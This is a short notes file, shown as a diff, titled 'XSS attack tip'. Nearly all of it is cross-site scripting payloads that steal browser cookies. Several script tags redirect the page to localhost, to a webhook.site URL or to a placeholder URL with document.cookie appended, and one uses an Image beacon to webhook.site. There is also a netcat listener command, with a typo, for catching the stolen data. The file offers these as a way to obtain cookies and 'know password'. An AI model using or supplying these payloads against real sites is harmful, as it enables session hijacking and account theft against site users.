@@ -1,0 +1,18 @@
+XSS attack tip
+
+get cookie !! can know password !!!
+
+
+<script>document.location="http://localhost:8888" + document.cookie</script>
+10.249.50.236
+
+<script>document.location="http://localhost:8888" + document.cookie</script>
+https://webhook.site/c750c046-cceb-4ef3-9a33-77d76670d920
+
+<script>document.location="https://webhook.site/c750c046-cceb-4ef3-9a33-77d76670d920" + document.cookie;</script>
+
+linux
+nc- nvlp 8000
+<script>document.location="URL" + document.cookie</script>
+
+<script>new Image().src="https://webhook.site/c750c046-cceb-4ef3-9a33-77d76670d920"+document.cookie;</script>
